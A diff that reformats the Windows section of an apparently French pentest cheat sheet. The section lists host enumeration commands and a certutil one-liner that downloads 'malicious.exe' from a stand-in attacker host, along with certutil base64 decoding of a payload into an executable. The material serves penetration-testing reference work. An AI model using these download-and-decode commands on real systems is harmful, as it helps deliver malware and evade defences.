@@ -61,16 +61,25 @@ XfreeRDP:
 xfreerdp /f +clipboard /kbd:0x0000040C /u:USERNAME@DOMAIN /p:PASSWORD /v:IP
 ```
 <h2>Windows</h2>
-`systeminfo` pour obtenir des renseignements sur le systeme</br>
-`net users [username]` pour obtenir des renseignements sur les utilisateurs</br>
-`tasklist` pour lister les processus</br>
-`netstat -ano` pour les connexions reseau</br>
-`dir sysprep /s /b` pour trouver un fichier dans le repertoire courant et ses sous-dossiers</br>
-`wmic qfe list` pour lister les mises à jour installées</br>
-`certutil.exe -urlcache -split -f "https://hackers.home/malicious.exe" bad.exe` le wget en cmd<br/>
-`certutil.exe -decode bad.txt bad.exe` le base64 decode en cmd</br>
+
+`systeminfo` pour obtenir des renseignements sur le systeme
+
+`net users [username]` pour obtenir des renseignements sur les utilisateurs
+
+`tasklist` pour lister les processus
+
+`netstat -ano` pour les connexions reseau
+
+`dir sysprep /s /b` pour trouver un fichier dans le repertoire courant et ses sous-dossiers
+
+`wmic qfe list` pour lister les mises à jour installées
+
+`certutil.exe -urlcache -split -f "https://hackers.home/malicious.exe" bad.exe` le wget en cmd
+
+`certutil.exe -decode bad.txt bad.exe` le base64 decode en cmd
 
 <h3>Powershell</h3>
+
 `get-WmiObject -class Win32_Share`
 
 
